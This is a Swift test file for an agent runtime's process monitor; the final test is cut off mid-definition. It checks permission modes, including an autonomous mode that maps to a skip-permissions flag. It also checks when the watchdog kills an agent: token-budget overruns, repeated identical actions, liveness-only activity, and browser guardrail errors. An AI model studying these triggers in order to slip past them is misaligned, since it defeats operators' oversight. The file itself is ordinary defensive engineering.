import Testing
import Foundation
@testable import ASTRA
import ASTRACore

private final class MonitorMockProcess: AgentRuntimeProcessControl {
    private(set) var didTerminate = false
    var isRunning: Bool { !didTerminate }
    var terminationStatus: Int32 { didTerminate ? 143 : 0 }

    func terminate() {
        didTerminate = true
    }
}

@Suite("Claude permission policy")
@MainActor
struct ClaudePermissionPolicyTests {

    @Test("Autonomous policy produces skip-permissions flag")
    func autonomousPolicyFlags() {
        let worker = AgentRuntimeWorker()
        worker.permissionPolicy = .autonomous
        #expect(worker.permissionPolicy.cliArguments == ["--dangerously-skip-permissions"])
    }

    @Test("Restricted policy produces no CLI flags")
    func restrictedPolicyFlags() {
        let worker = AgentRuntimeWorker()
        worker.permissionPolicy = .restricted
        #expect(worker.permissionPolicy.cliArguments.isEmpty)
    }

    @Test("Interactive policy produces no CLI flags")
    func interactivePolicyFlags() {
        let worker = AgentRuntimeWorker()
        worker.permissionPolicy = .interactive
        #expect(worker.permissionPolicy.cliArguments.isEmpty)
    }

    @Test("Workers default to restricted permissions")
    func workerDefaultsRestricted() {
        let worker = AgentRuntimeWorker()
        #expect(worker.skipPermissions == false)
        #expect(worker.permissionPolicy == .restricted)
    }
}

@Suite("ProcessMonitor — Budget, Repetition, and Idle Timeout")
struct ProcessMonitorTests {

    // MARK: - Budget Enforcement

    @Test("Budget exceeded via estimated tokens")
    func budgetExceededEstimated() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 100)

        // 500 chars of text ≈ 125 estimated tokens, exceeds budget of 100
        let event = ParsedEvent.text(text: String(repeating: "x", count: 500))
        let shouldKill = monitor.processEvent(event, process: nil)

        #expect(shouldKill == true)
        #expect(monitor.budgetExceeded == true)
        #expect(monitor.estimatedTokens == 125)
    }

    @Test("Warning budget mode does not kill on estimated overage")
    func warningBudgetModeDoesNotKillEstimatedOverage() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: 100,
            budgetEnforcementMode: .warning
        )

        let event = ParsedEvent.text(text: String(repeating: "x", count: 500))
        let shouldKill = monitor.processEvent(event, process: nil)

        #expect(shouldKill == false)
        #expect(monitor.budgetExceeded == false)
        #expect(monitor.budgetWarning == true)
        #expect(monitor.estimatedTokens == 125)
    }

    @Test("Warning budget mode does not kill on reported overage")
    func warningBudgetModeDoesNotKillReportedOverage() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: 1000,
            budgetEnforcementMode: .warning
        )

        let event = ParsedEvent.result(
            text: "done",
            costUSD: 0.01,
            totalInputTokens: 800,
            totalOutputTokens: 300,
            durationMs: 5000,
            numTurns: 1,
            isError: false
        )
        let shouldKill = monitor.processEvent(event, process: nil)

        #expect(shouldKill == false)
        #expect(monitor.budgetExceeded == false)
        #expect(monitor.budgetWarning == true)
    }

    @Test("Budget not exceeded when under limit")
    func budgetNotExceeded() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 10000)

        let event = ParsedEvent.text(text: "Hello world")
        let shouldKill = monitor.processEvent(event, process: nil)

        #expect(shouldKill == false)
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Terminal browser tool result stops provider")
    func terminalBrowserToolResultStopsProvider() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)
        let process = MonitorMockProcess()

        let commandKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "toolu_browser", input: [
                "command": "astra-browser google-docs-read-document"
            ]),
            process: process
        )
        let resultKill = monitor.processEvent(
            .toolResult(
                toolId: "toolu_browser",
                content: #"{"ok":false,"error":"google_docs_safe_edit_unavailable"}"#
            ),
            process: process
        )

        #expect(commandKill == false)
        #expect(resultKill == true)
        #expect(process.didTerminate == true)
        #expect(monitor.runtimeStopped == true)
        #expect(monitor.runtimeStopReason == "google_docs_safe_edit_unavailable")
        #expect(monitor.budgetExceeded == false)
        #expect(monitor.policyViolation == false)
    }

    @Test("Browser action budget result stops provider")
    func browserActionBudgetResultStopsProvider() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)

        let _ = monitor.processEvent(
            .toolUse(name: "astra-browser", id: "browser_tool", input: nil),
            process: nil
        )
        let shouldKill = monitor.processEvent(
            .toolResult(
                toolId: "browser_tool",
                content: #"{"ok":false,"error":"browser_action_budget_exceeded"}"#
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.runtimeStopReason == "browser_action_budget_exceeded")
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Drive file name mismatch stops provider")
    func driveFileNameMismatchStopsProvider() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)

        let _ = monitor.processEvent(
            .toolUse(name: "astra-browser", id: "browser_tool", input: nil),
            process: nil
        )
        let shouldKill = monitor.processEvent(
            .toolResult(
                toolId: "browser_tool",
                content: #"{"ok":false,"error":"drive_file_name_mismatch","title":"Death Data Integration - Google Slides"}"#
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.runtimeStopReason == "drive_file_name_mismatch")
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Drive file not opened stops provider")
    func driveFileNotOpenedStopsProvider() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)

        let _ = monitor.processEvent(
            .toolUse(name: "astra-browser", id: "browser_tool", input: nil),
            process: nil
        )
        let shouldKill = monitor.processEvent(
            .toolResult(
                toolId: "browser_tool",
                content: #"{"ok":false,"error":"drive_file_not_opened","candidateCount":1}"#
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.runtimeStopReason == "drive_file_not_opened")
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Google Docs verification failure stops provider")
    func googleDocsVerificationFailureStopsProvider() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)

        let _ = monitor.processEvent(
            .toolUse(name: "astra-browser", id: "browser_tool", input: nil),
            process: nil
        )
        let shouldKill = monitor.processEvent(
            .toolResult(
                toolId: "browser_tool",
                content: #"{"ok":false,"error":"google_docs_safe_edit_verification_failed"}"#
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.runtimeStopReason == "google_docs_safe_edit_verification_failed")
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Async browser shell continuation failure stops provider")
    func asyncBrowserShellContinuationFailureStopsProvider() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)
        let process = MonitorMockProcess()

        let commandKill = monitor.processEvent(
            .toolUse(name: "bash", id: "browser_command", input: [
                "command": "astra-browser google-docs-replace-document --text 'translated' --verify 'translated'"
            ]),
            process: process
        )
        let pendingKill = monitor.processEvent(
            .toolResult(
                toolId: "browser_command",
                content: #"<command with shellId: 2 is still running after 30 seconds. Use read_bash with shellId "2" to retrieve the output.>"#
            ),
            process: process
        )
        let readKill = monitor.processEvent(
            .toolUse(name: "read_bash", id: "browser_read", input: [
                "shellId": "2"
            ]),
            process: process
        )
        let resultKill = monitor.processEvent(
            .toolResult(
                toolId: "browser_read",
                content: #"{"ok":false,"error":"google_docs_safe_edit_verification_failed"}"#
            ),
            process: process
        )

        #expect(commandKill == false)
        #expect(pendingKill == false)
        #expect(readKill == false)
        #expect(resultKill == true)
        #expect(process.didTerminate == true)
        #expect(monitor.runtimeStopped == true)
        #expect(monitor.runtimeStopReason == "google_docs_safe_edit_verification_failed")
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Google Docs browser copy unavailable stops provider")
    func googleDocsBrowserCopyUnavailableStopsProvider() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)

        let _ = monitor.processEvent(
            .toolUse(name: "astra-browser", id: "browser_tool", input: nil),
            process: nil
        )
        let shouldKill = monitor.processEvent(
            .toolResult(
                toolId: "browser_tool",
                content: #"{"ok":false,"error":"google_docs_browser_copy_unavailable"}"#
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.runtimeStopReason == "google_docs_browser_copy_unavailable")
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Google Docs controlled browser required stops provider")
    func googleDocsControlledBrowserRequiredStopsProvider() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)

        let _ = monitor.processEvent(
            .toolUse(name: "astra-browser", id: "browser_tool", input: nil),
            process: nil
        )
        let shouldKill = monitor.processEvent(
            .toolResult(
                toolId: "browser_tool",
                content: #"{"ok":false,"error":"google_docs_controlled_browser_required","reason":"embedded_webkit_clipboard_unavailable"}"#
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.runtimeStopReason == "google_docs_controlled_browser_required")
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Quoted browser guardrail text in unrelated Bash output does not stop provider")
    func quotedBrowserGuardrailTextInUnrelatedBashOutputDoesNotStopProvider() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)
        let process = MonitorMockProcess()

        let commandKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "ps_check", input: [
                "command": #"ps aux | grep -i "main_OMOP_Subset\|python3.*IRB66991" | grep -v grep"#
            ]),
            process: process
        )
        let resultKill = monitor.processEvent(
            .toolResult(
                toolId: "ps_check",
                content: #"alvaro1 31266 ?? /Users/alvaro1/.local/bin/claude -p For full Google Docs reads: astra-browser google-docs-read-document. If it returns google_docs_controlled_browser_required, stop instead of probing the editor."#
            ),
            process: process
        )

        #expect(commandKill == false)
        #expect(resultKill == false)
        #expect(process.didTerminate == false)
        #expect(monitor.runtimeStopped == false)
        #expect(monitor.runtimeStopReason == nil)
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Uncorrelated structured browser guardrail result stops provider")
    func uncorrelatedStructuredBrowserGuardrailResultStopsProvider() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)

        let shouldKill = monitor.processEvent(
            .toolResult(
                toolId: "unknown_tool",
                content: #"{"ok":false,"error":"google_docs_controlled_browser_required","reason":"embedded_webkit_clipboard_unavailable"}"#
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.runtimeStopped == true)
        #expect(monitor.runtimeStopReason == "google_docs_controlled_browser_required")
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Google Docs controlled browser required after visible read does not stop provider")
    func googleDocsControlledBrowserRequiredAfterVisibleReadDoesNotStopProvider() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)

        let _ = monitor.processEvent(
            .toolUse(name: "astra-browser", id: "visible_read", input: nil),
            process: nil
        )
        let visibleReadKill = monitor.processEvent(
            .toolResult(
                toolId: "visible_read",
                content: #"{"ok":true,"googleDocsMode":"visible_page","partialSummaryAllowed":true,"coverage":"partial","content":"Visible page content"}"#
            ),
            process: nil
        )
        let _ = monitor.processEvent(
            .toolUse(name: "astra-browser", id: "full_read", input: nil),
            process: nil
        )
        let fullReadKill = monitor.processEvent(
            .toolResult(
                toolId: "full_read",
                content: #"{"ok":false,"error":"google_docs_controlled_browser_required","reason":"embedded_webkit_clipboard_unavailable"}"#
            ),
            process: nil
        )

        #expect(visibleReadKill == false)
        #expect(fullReadKill == false)
        #expect(monitor.runtimeStopped == false)
        #expect(monitor.runtimeStopReason == nil)
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Repeated Google Docs controlled browser required after visible read stops provider")
    func repeatedGoogleDocsControlledBrowserRequiredAfterVisibleReadStopsProvider() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)

        let _ = monitor.processEvent(
            .toolUse(name: "astra-browser", id: "visible_read", input: nil),
            process: nil
        )
        _ = monitor.processEvent(
            .toolResult(
                toolId: "visible_read",
                content: #"{"ok":true,"googleDocsMode":"visible_page","partialSummaryAllowed":true,"coverage":"partial","content":"Visible page content"}"#
            ),
            process: nil
        )
        let _ = monitor.processEvent(
            .toolUse(name: "astra-browser", id: "full_read_1", input: nil),
            process: nil
        )
        _ = monitor.processEvent(
            .toolResult(
                toolId: "full_read_1",
                content: #"{"ok":false,"error":"google_docs_controlled_browser_required","reason":"embedded_webkit_clipboard_unavailable"}"#
            ),
            process: nil
        )
        let _ = monitor.processEvent(
            .toolUse(name: "astra-browser", id: "full_read_2", input: nil),
            process: nil
        )
        let repeatedKill = monitor.processEvent(
            .toolResult(
                toolId: "full_read_2",
                content: #"{"ok":false,"error":"google_docs_controlled_browser_required","reason":"embedded_webkit_clipboard_unavailable"}"#
            ),
            process: nil
        )

        #expect(repeatedKill == true)
        #expect(monitor.runtimeStopped == true)
        #expect(monitor.runtimeStopReason == "google_docs_controlled_browser_required")
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Controlled browser unavailable stops provider")
    func controlledBrowserUnavailableStopsProvider() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)

        let _ = monitor.processEvent(
            .toolUse(name: "astra-browser", id: "browser_tool", input: nil),
            process: nil
        )
        let shouldKill = monitor.processEvent(
            .toolResult(
                toolId: "browser_tool",
                content: #"{"ok":false,"error":"controlled_browser_unavailable"}"#
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.runtimeStopReason == "controlled_browser_unavailable")
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Unauthorized browser bridge stops provider")
    func unauthorizedBrowserBridgeStopsProvider() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)

        let _ = monitor.processEvent(
            .toolUse(name: "Bash", id: "browser_tool", input: [
                "command": "astra-browser google-drive-open --name 'Alvaro1 t'"
            ]),
            process: nil
        )
        let shouldKill = monitor.processEvent(
            .toolResult(
                toolId: "browser_tool",
                content: #"{"error":"{\n  \"error\" : \"unauthorized_browser_bridge_request\",\n  \"ok\" : false\n}","ok":false}"#
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.runtimeStopReason == "unauthorized_browser_bridge_request")
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Terminal browser error text from unrelated tools does not stop provider")
    func terminalBrowserErrorFromUnrelatedToolDoesNotStopProvider() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)

        let shouldKill = monitor.processEvent(
            .toolResult(
                toolId: "read_tool",
                content: "A note mentioned google_docs_safe_edit_unavailable, but this was not a browser tool result."
            ),
            process: nil
        )

        #expect(shouldKill == false)
        #expect(monitor.runtimeStopped == false)
    }

    @Test("Budget exceeded via result event exact count")
    func budgetExceededFromResult() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 1000)

        let event = ParsedEvent.result(
            text: "done",
            costUSD: 0.01,
            totalInputTokens: 800,
            totalOutputTokens: 300,
            durationMs: 5000,
            numTurns: 1,
            isError: false
        )
        let shouldKill = monitor.processEvent(event, process: nil)

        #expect(shouldKill == true)
        #expect(monitor.budgetExceeded == true)
    }

    @Test("Budget exceeded via stream usage event")
    func budgetExceededFromStreamUsage() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 1000)

        let shouldKill = monitor.processEvent(
            .usage(totalInputTokens: 900, totalOutputTokens: 200),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.budgetExceeded == true)
    }

    @Test("Warning budget mode does not kill on stream usage overage")
    func warningBudgetModeDoesNotKillStreamUsageOverage() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: 1000,
            budgetEnforcementMode: .warning
        )

        let shouldKill = monitor.processEvent(
            .usage(totalInputTokens: 900, totalOutputTokens: 200),
            process: nil
        )

        #expect(shouldKill == false)
        #expect(monitor.budgetExceeded == false)
        #expect(monitor.budgetWarning == true)
    }

    @Test("Final result budget overage after astra complete is warning only")
    func finalBudgetOverageAfterAstraCompleteDoesNotKill() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 1000)

        let complete = ParsedEvent.astraProtocol(.valid(.complete(
            summary: "Updated the slide.",
            verifiedBy: "Snapshot confirmed"
        )))
        let completeKill = monitor.processEvent(complete, process: nil)

        let result = ParsedEvent.result(
            text: "done",
            costUSD: 0.01,
            totalInputTokens: 2_000,
            totalOutputTokens: 100,
            durationMs: 5000,
            numTurns: 4,
            isError: false
        )
        let resultKill = monitor.processEvent(result, process: nil)

        #expect(completeKill == false)
        #expect(resultKill == false)
        #expect(monitor.budgetExceeded == false)
        #expect(monitor.finalReportedBudgetExceededAfterCompletion == true)
    }

    @Test("Errored final result after astra complete still exceeds budget")
    func erroredFinalBudgetOverageAfterAstraCompleteStillKills() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 1000)
        let _ = monitor.processEvent(.astraProtocol(.valid(.complete(
            summary: "Done",
            verifiedBy: nil
        ))), process: nil)

        let result = ParsedEvent.result(
            text: "provider failed",
            costUSD: 0.01,
            totalInputTokens: 2_000,
            totalOutputTokens: 100,
            durationMs: 5000,
            numTurns: 4,
            isError: true
        )
        let shouldKill = monitor.processEvent(result, process: nil)

        #expect(shouldKill == true)
        #expect(monitor.budgetExceeded == true)
        #expect(monitor.finalReportedBudgetExceededAfterCompletion == false)
    }

    @Test("Unlimited budget never exceeds")
    func unlimitedBudget() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)

        // Massive text with varying content to avoid repetition breaker
        for i in 0..<100 {
            let _ = monitor.processEvent(.text(text: "chunk \(i) " + String(repeating: "x", count: 10000)), process: nil)
        }

        #expect(monitor.budgetExceeded == false)
    }

    @Test("Tool use and tool result add to token estimate")
    func toolTokenEstimation() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 10000)

        let _ = monitor.processEvent(.toolUse(name: "Read", id: "t1", input: nil), process: nil)
        #expect(monitor.estimatedTokens == 100)

        let _ = monitor.processEvent(.toolResult(toolId: "t1", content: ""), process: nil)
        #expect(monitor.estimatedTokens == 300)
    }

    @Test("Team events add to token estimate")
    func teamTokenEstimation() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 10000)

        let _ = monitor.processEvent(.teammateStarted(taskId: "t1", name: "agent", prompt: "do stuff"), process: nil)
        #expect(monitor.estimatedTokens == 50)

        let _ = monitor.processEvent(.teamMessage(from: "lead", to: "agent", content: "check this"), process: nil)
        #expect(monitor.estimatedTokens == 100) // 50 + max(50, 10/4)
    }

    @Test("Astra protocol events do not affect budget or repetition")
    func astraProtocolEventsAreAdvisory() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 1, maxRepetitions: 1)
        let event = ParsedEvent.astraProtocol(.valid(.complete(summary: "Done", verifiedBy: "swift test")))

        let shouldKill = monitor.processEvent(event, process: nil)

        #expect(shouldKill == false)
        #expect(monitor.estimatedTokens == 0)
        #expect(monitor.budgetExceeded == false)
        #expect(monitor.repetitionKilled == false)
    }

    // MARK: - Repetition Circuit Breaker

    @Test("Repetition kills after max identical events")
    func repetitionKill() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxRepetitions: 3)

        let event = ParsedEvent.toolUse(name: "Read", id: "t1", input: nil)
        let _ = monitor.processEvent(event, process: nil) // 1
        #expect(monitor.repetitionKilled == false)

        let _ = monitor.processEvent(event, process: nil) // 2
        #expect(monitor.repetitionKilled == false)

        let shouldKill = monitor.processEvent(event, process: nil) // 3 — triggers
        #expect(shouldKill == true)
        #expect(monitor.repetitionKilled == true)
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Different events reset repetition counter")
    func repetitionResets() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxRepetitions: 3)

        let _ = monitor.processEvent(.toolUse(name: "Read", id: "t1", input: nil), process: nil)
        let _ = monitor.processEvent(.toolUse(name: "Read", id: "t1", input: nil), process: nil)
        // Different event resets counter
        let _ = monitor.processEvent(.text(text: "hello"), process: nil)
        let _ = monitor.processEvent(.toolUse(name: "Read", id: "t1", input: nil), process: nil)
        let shouldKill = monitor.processEvent(.toolUse(name: "Read", id: "t1", input: nil), process: nil)

        #expect(shouldKill == false) // only 2 in a row, not 3
        #expect(monitor.repetitionKilled == false)
    }

    @Test("Growing tool result output resets repetition counter")
    func growingToolResultOutputResetsRepetitionCounter() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxRepetitions: 3)

        for index in 1...6 {
            let shouldKill = monitor.processEvent(
                .toolResult(toolId: "toolu_streaming", content: String(repeating: "x", count: index)),
                process: nil
            )
            #expect(shouldKill == false)
        }

        #expect(monitor.repetitionKilled == false)
    }

    @Test("Default max repetitions is 8")
    func defaultMaxRepetitions() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)
        let event = ParsedEvent.toolUse(name: "Glob", id: "t1", input: nil)

        for i in 1...7 {
            let _ = monitor.processEvent(event, process: nil)
            #expect(monitor.repetitionKilled == false, "Should not kill at repetition \(i)")
        }

        let shouldKill = monitor.processEvent(event, process: nil) // 8th
        #expect(shouldKill == true)
        #expect(monitor.repetitionKilled == true)
    }

    @Test("Provider lifecycle metadata does not trigger repetition")
    func lifecycleMetadataDoesNotTriggerRepetition() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxRepetitions: 3)

        for index in 0..<12 {
            let shouldKill = monitor.processEvent(
                .systemInit(model: "claude-opus-4-6", sessionId: "session-\(index)"),
                process: nil
            )
            #expect(shouldKill == false)
        }

        #expect(monitor.repetitionKilled == false)
    }

    @Test("Provider diagnostic metadata does not trigger repetition")
    func diagnosticMetadataDoesNotTriggerRepetition() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxRepetitions: 3)

        for _ in 0..<12 {
            let shouldKill = monitor.processEvent(.unknown(type: "queue-operation"), process: nil)
            #expect(shouldKill == false)
        }

        #expect(monitor.repetitionKilled == false)
    }

    @Test("Empty tool results do not trigger repetition")
    func emptyToolResultsDoNotTriggerRepetition() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxRepetitions: 3)

        for _ in 0..<12 {
            let shouldKill = monitor.processEvent(.toolResult(toolId: "toolu_metadata", content: ""), process: nil)
            #expect(shouldKill == false)
        }

        #expect(monitor.repetitionKilled == false)
    }

    @Test("Tool repetition ignores volatile provider IDs")
    func toolRepetitionIgnoresVolatileProviderIDs() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxRepetitions: 3)

        let input = ["command": "pwd"]
        let _ = monitor.processEvent(.toolUse(name: "Bash", id: "toolu_1", input: input), process: nil)
        let _ = monitor.processEvent(.toolUse(name: "Bash", id: "toolu_2", input: input), process: nil)
        let shouldKill = monitor.processEvent(.toolUse(name: "Bash", id: "toolu_3", input: input), process: nil)

        #expect(shouldKill == true)
        #expect(monitor.repetitionKilled == true)
    }

    // MARK: - Event Signatures

    @Test("Event signatures are distinct per type")
    func eventSignatures() {
        let sigs = [
            AgentRuntimeWorker.ProcessMonitor.eventSignature(.text(text: "hello")),
            AgentRuntimeWorker.ProcessMonitor.eventSignature(.thinking(text: "hello")),
            AgentRuntimeWorker.ProcessMonitor.eventSignature(.toolUse(name: "Read", id: "t1", input: nil)),
            AgentRuntimeWorker.ProcessMonitor.eventSignature(.toolResult(toolId: "t1", content: "")),
            AgentRuntimeWorker.ProcessMonitor.eventSignature(.systemInit(model: "sonnet", sessionId: "s1")),
            AgentRuntimeWorker.ProcessMonitor.eventSignature(.result(text: nil, costUSD: nil, totalInputTokens: 0, totalOutputTokens: 0, durationMs: nil, numTurns: nil, isError: false)),
            AgentRuntimeWorker.ProcessMonitor.eventSignature(.astraProtocol(.invalid(reason: "bad marker"))),
        ]
        // All signatures should be unique
        #expect(Set(sigs).count == sigs.count)
    }

    @Test("Text signatures truncate at 80 chars")
    func signatureTruncation() {
        let longText = String(repeating: "a", count: 200)
        let sig = AgentRuntimeWorker.ProcessMonitor.eventSignature(.text(text: longText))
        #expect(sig.count <= 95) // "text:" prefix + length + 80 chars
    }

    @Test("Repetition signatures classify provider-neutral progress")
    func repetitionSignaturesClassifyProviderNeutralProgress() {
        #expect(AgentRuntimeWorker.ProcessMonitor.repetitionSignature(.systemInit(model: "sonnet", sessionId: "s1")) == nil)
        #expect(AgentRuntimeWorker.ProcessMonitor.repetitionSignature(.unknown(type: "last-prompt")) == nil)
        #expect(AgentRuntimeWorker.ProcessMonitor.repetitionSignature(.usage(totalInputTokens: 1, totalOutputTokens: 0)) == nil)
        #expect(AgentRuntimeWorker.ProcessMonitor.repetitionSignature(.result(text: nil, costUSD: nil, totalInputTokens: 0, totalOutputTokens: 0, durationMs: nil, numTurns: nil, isError: false)) == nil)
        #expect(AgentRuntimeWorker.ProcessMonitor.repetitionSignature(.toolResult(toolId: "t1", content: "")) == nil)

        let first = AgentRuntimeWorker.ProcessMonitor.repetitionSignature(.toolUse(name: "Bash", id: "toolu_1", input: ["command": "pwd"]))
        let second = AgentRuntimeWorker.ProcessMonitor.repetitionSignature(.toolUse(name: "Bash", id: "toolu_2", input: ["command": "pwd"]))
        #expect(first == second)
        #expect(first != nil)
    }

    @Test("Claude partial thinking delta is provider liveness")
    func claudePartialThinkingDeltaIsProviderLiveness() throws {
        let line = """
        {"type":"stream_event","event":{"type":"content_block_delta","index":0,"delta":{"type":"thinking_delta","thinking":"The user wants a Masterball page"}},"session_id":"s1","parent_tool_use_id":null,"uuid":"u1"}
        """
        let parsed = try #require(StreamEventParser.parse(line: line))

        #expect(AgentRuntimeWorker.ProcessMonitor.progressKind(for: parsed) == .providerLiveness)
        #expect(AgentRuntimeWorker.ProcessMonitor.repetitionSignature(parsed) != nil)
    }

    @Test("Thinking-only provider activity stops as no actionable progress")
    func thinkingOnlyProviderActivityStopsAsNoActionableProgress() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            noSemanticProgressTimeoutSeconds: 0
        )
        let process = MonitorMockProcess()

        let shouldKillEvent = monitor.processEvent(
            .thinking(text: "The user wants a Masterball page"),
            process: process
        )
        let watchdogStopped = monitor.evaluateWatchdogTimeoutForTesting(process: process)

        #expect(shouldKillEvent == false)
        #expect(watchdogStopped == true)
        #expect(process.didTerminate == true)
        #expect(monitor.runtimeStopReason == "provider_no_actionable_progress")
        #expect(monitor.runtimeStopMessage?.contains("provider-side liveness") == true)
    }

    @Test("Default liveness-only timeout gives real providers a bounded action window")
    func defaultLivenessOnlyTimeoutGivesRealProvidersBoundedActionWindow() {
        let shortRun = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            idleTimeoutSeconds: 60
        )
        let artifactRun = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            idleTimeoutSeconds: 240
        )
        let longRun = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            idleTimeoutSeconds: 600
        )

        #expect(shortRun.noSemanticProgressTimeoutSeconds == 60)
        #expect(artifactRun.noSemanticProgressTimeoutSeconds == 180)
        #expect(longRun.noSemanticProgressTimeoutSeconds == 180)
    }

    @Test("Visible provider text prevents liveness-only stop")
    func visibleProviderTextPreventsLivenessOnlyStop() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            noSemanticProgressTimeoutSeconds: 0
        )
        let process = MonitorMockProcess()

        let shouldKillEvent = monitor.processEvent(
            .text(text: "I'll create the file now."),
            process: process
        )
        let watchdogStopped = monitor.evaluateWatchdogTimeoutForTesting(process: process)

        #expect(shouldKillEvent == false)
        #expect(watchdogStopped == false)
        #expect(process.didTerminate == false)
        #expect(monitor.runtimeStopReason == nil)
    }

    // MARK: - ProcessResult

    @Test("ProcessResult defaults")
    func processResultDefaults() {
        let result = AgentRuntimeWorker.ProcessResult(exitCode: 0)
        #expect(result.exitCode == 0)
        #expect(result.error == nil)
        #expect(result.budgetExceeded == false)
        #expect(result.timedOut == false)
        #expect(result.repetitionKilled == false)
    }

    @Test("ProcessResult with all flags")
    func processResultFlags() {
        let result = AgentRuntimeWorker.ProcessResult(
            exitCode: 137,
            error: "killed",
            budgetExceeded: true,
            timedOut: false,
            repetitionKilled: true
        )
        #expect(result.exitCode == 137)
        #expect(result.budgetExceeded == true)
        #expect(result.repetitionKilled == true)
        #expect(result.timedOut == false)
    }

    // MARK: - Resume Budget Calculation

    @Test("Resume budget is remaining tokens")
    func resumeBudgetCalculation() {
        // Simulate: budget 10000, already used 7000 → remaining 3000
        let totalBudget = 10000
        let used = 7000
        let remaining = max(1000, totalBudget - used)
        #expect(remaining == 3000)

        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: remaining)
        // 12004 chars / 4 = 3001 estimated tokens → exceeds budget of 3000
        let event = ParsedEvent.text(text: String(repeating: "x", count: 12004))
        let shouldKill = monitor.processEvent(event, process: nil)
        #expect(shouldKill == true)
    }

    @Test("Resume with almost exhausted budget gets minimum 1000")
    func resumeMinimumBudget() {
        let totalBudget = 10000
        let used = 9800
        let remaining = max(1000, totalBudget - used)
        #expect(remaining == 1000) // Floor of 1000

        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: remaining)
        // Small text should not exceed 1000
        let shouldKill = monitor.processEvent(.text(text: "hello"), process: nil)
        #expect(shouldKill == false)
    }

    @Test("Resume with unlimited budget stays unlimited")
    func resumeUnlimitedBudget() {
        let totalBudget = 0 // 0 means unlimited
        let remaining: Int
        if totalBudget == 0 {
            remaining = Int.max
        } else {
            remaining = max(1000, totalBudget)
        }
        #expect(remaining == Int.max)
    }

    // MARK: - Turn Counting

    @Test("Turn count increments on result events")
    func turnCountIncrementsOnResult() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxTurns: 10)

        let result = ParsedEvent.result(
            text: "done",
            costUSD: 0.001,
